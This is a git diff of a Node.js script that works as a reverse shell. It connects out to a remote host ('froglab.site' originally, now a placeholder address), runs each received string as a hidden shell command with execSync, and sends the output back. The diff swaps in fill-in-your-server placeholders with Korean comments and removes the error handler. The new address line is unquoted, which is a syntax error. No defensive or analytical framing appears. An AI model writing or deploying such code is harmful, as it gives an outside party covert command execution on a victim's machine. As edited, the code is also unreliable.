@@ -4,12 +4,12 @@ const mngVersion = {
 }
 const net = require("net")
 const childprocess = require("child_process")
-const HOST_PORT = 111;
-const HOST_Address = 'froglab.site'
+const HOST_PORT = 1010; // [서버 포트 입력]
+const HOST_Address = 127.0.0.1 // [도메인 입력]
 
 
-let retrying = false;
-let retryingCnt = 5;
+let retrying = false; 
+let retryingCnt = 5; //재연결 시도 횟수
 
 const runConnection =() => {
     if(retryingCnt === 5){
@@ -33,7 +33,6 @@ const dataEventHandler = (data) => {
             windowsHide: true
         }
         cp = childprocess.execSync(command+`\n`,option);
-        // console.log('자 결과는 여기있따!!!', cp.toString())
         socket.write(`ChildProcess Result : ${cp.toString()}`);
     }
 }
@@ -56,15 +55,11 @@ const closeEventHandler =() => {
     }
 }
 
-const errorEventHandler =(error) => {
-    // setTimeout(runConnection, 1000)
-}
 
 var socket = new net.Socket();
 socket.on('connect', connectEventHandler);
 socket.on('data',    dataEventHandler);
 socket.on('end',     endEventHandler);
 socket.on('close',   closeEventHandler);
-socket.on('error',   errorEventHandler);
 
 runConnection();
